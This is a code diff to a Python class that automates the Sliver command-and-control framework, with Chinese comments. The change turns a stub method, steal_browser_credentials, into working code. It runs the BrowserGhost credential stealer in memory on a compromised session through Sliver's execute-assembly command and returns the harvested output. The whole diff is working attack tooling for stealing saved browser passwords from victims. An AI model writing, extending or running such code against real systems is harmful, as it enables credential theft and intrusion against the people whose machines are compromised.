@@ -231,11 +231,22 @@ class SliverManager:
         return [{"command": command, "output": output[:1000]}]
 
     def steal_browser_credentials(self, session_id: str) -> Dict:
-        """提取浏览器保存的凭证"""
+        """提取浏览器保存的凭证，通过 execute-assembly 在内存中执行 BrowserGhost"""
         print(f"[*] 提取浏览器凭证...")
+
+        local_path = "D:/sliver/BrowserGhost/bin/Release/BrowserGhost.exe"
+        if not os.path.isfile(local_path):
+            return {
+                "success": False,
+                "error": f"BrowserGhost.exe 不存在: {local_path}",
+            }
+
+        commands = f"use {session_id}\nexecute-assembly \"{local_path}\""
+        output = self._run_sliver_command(commands, timeout=300)
+
         return {
-            "status": "not_implemented",
-            "message": "需要先编译 BrowserGhost",
+            "success": "Output:" in output,
+            "output": output[-1000:] if len(output) > 1000 else output,
         }
 
     # ========== 任务管理 ==========
